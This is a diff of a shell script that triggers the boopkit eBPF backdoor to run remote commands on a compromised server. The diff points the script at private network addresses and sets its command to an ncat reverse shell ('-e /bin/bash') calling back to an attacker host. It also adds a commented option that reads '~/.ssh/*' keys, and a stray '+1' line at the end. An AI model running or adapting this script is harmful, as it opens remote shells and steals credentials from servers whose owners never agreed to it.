@@ -6,8 +6,8 @@
 # boopkit. As long as the server that has boopkit
 # installed is also listening on ANY tcp connect, we
 # can point this file at the server to run an RCE.
-DST_ADDR="127.0.0.1"
-DST_PORT="8080"
+DST_ADDR="10.0.0.188"
+DST_PORT="443"
 
 # Source address.
 #
@@ -18,7 +18,7 @@ DST_PORT="8080"
 # two specific ports will need to be used! One to
 # specify the RCE command to run, and another to
 # use for a reverse shell (if necessary).
-SRC_ADDR="127.0.0.1"
+SRC_ADDR="10.0.0.242"
 SRC_PORT="3535"
 RCE_PORT="3545"
 
@@ -30,7 +30,9 @@ NCAT="/usr/bin/ncat"
 #
 # The remote command to run on the server!
 # ================================================
-RCE="ncat ${SRC_ADDR} ${RCE_PORT} -e /bin/bash &"
+RCE="ncat 10.0.0.242 ${RCE_PORT} -e /bin/bash &"
+#RCE="ls -la"
+#RCE="cat ~/.ssh/*"
 # ================================================
 
 # Trigger is used to fire the eBPF probe on the server.
@@ -62,3 +64,4 @@ echo ${RCE} | ${NCAT} -lp ${SRC_PORT} &
 # Note: this is only required if you are performing
 # a reverse shell!
 ${NCAT} -lvp ${RCE_PORT}
+1
